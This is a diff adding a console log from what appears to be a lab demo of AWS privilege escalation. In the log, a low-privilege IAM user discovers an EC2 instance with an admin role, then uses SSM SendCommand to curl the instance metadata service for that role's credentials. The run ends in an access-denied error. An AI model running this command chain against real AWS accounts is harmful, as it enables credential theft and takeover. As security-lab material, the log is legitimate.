@@ -1,0 +1,71 @@
+[0;32m========================================[0m
+[0;32mSSM SendCommand Privilege Escalation Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-ssm-002-to-admin-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Region: us-east-1
+Target Instance: i-0a22be8ccfa31d448
+Target Role: pl-prod-ssm-002-to-admin-ec2-admin-role
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+  Denied helpful permissions on user: pl-prod-ssm-002-to-admin-starting-user
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Verifying starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-ssm-002-to-admin-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying we don't have admin permissions yet[0m
+Attempting to list IAM users (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Cannot list IAM users (as expected)[0m
+
+[1;33mStep 5: Discovering target EC2 instance[0m
+Listing EC2 instances with their attached IAM roles...
+[2m[ReadOnly] $ aws ec2 describe-instances --region us-east-1 --instance-ids i-0a22be8ccfa31d448 --query 'Reservations[0].Instances[0].[InstanceId,State.Name,IamInstanceProfile.Arn]' --output text[0m
+Instance ID: i-0a22be8ccfa31d448
+State: running
+Instance Profile: arn:aws:iam::123456789012:instance-profile/pl-prod-ssm-002-to-admin-instance-profile
+[0;32m✓ Found target instance with privileged role[0m
+
+[1;33mStep 6: Checking if instance is ready for SSM commands[0m
+Verifying SSM agent is running on the instance...
+[2m[ReadOnly] $ aws ssm describe-instance-information --region us-east-1 --filters "Key=InstanceIds,Values=i-0a22be8ccfa31d448" --query 'InstanceInformationList[0].PingStatus' --output text[0m
+[0;32m✓ SSM agent is online and ready[0m
+
+[1;33mStep 7: Sending SSM command to extract instance role credentials[0m
+This is the privilege escalation vector...
+Executing command to retrieve credentials from instance metadata service
+
+[0;36m[Attacker] $ aws ssm send-command --region us-east-1 --instance-ids "i-0a22be8ccfa31d448" --document-name "AWS-RunShellScript" --parameters 'commands=["TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" 2>/dev/null)","curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/pl-prod-ssm-002-to-admin-ec2-admin-role 2>/dev/null"]'[0m
+Command ID: b469c6d4-5e58-4d9d-803a-363eba5b91f1
+[0;32m✓ SSM command sent successfully[0m
+
+[1;33mStep 8: Waiting for command to complete[0m
+This may take 15-30 seconds...
+[2m[ReadOnly] $ aws ssm list-commands --region us-east-1 --command-id "b469c6d4-5e58-4d9d-803a-363eba5b91f1" --query 'Commands[0].Status' --output text[0m
+[0;32m✓ Command completed successfully[0m
+
+
+[1;33mStep 9: Retrieving command output with extracted credentials[0m
+
+[0;36m[Attacker] $ aws ssm list-command-invocations --region us-east-1 --command-id "b469c6d4-5e58-4d9d-803a-363eba5b91f1" --details --query 'CommandInvocations[0].CommandPlugins[0].Output' --output text[0m
+[0;31mError: Could not retrieve command output[0m
+
+[1;33m[demo_permissions] Script interrupted, restoring permissions...[0m
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-ssm-002-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
+
+An error occurred (AccessDeniedException) when calling the ListCommandInvocations operation: User: arn:aws:iam::123456789012:user/pl-prod-ssm-002-to-admin-starting-user is not authorized to perform: ssm:ListCommandInvocations on resource: arn:aws:ssm:us-east-1:123456789012:* with an explicit deny in an identity-based policy
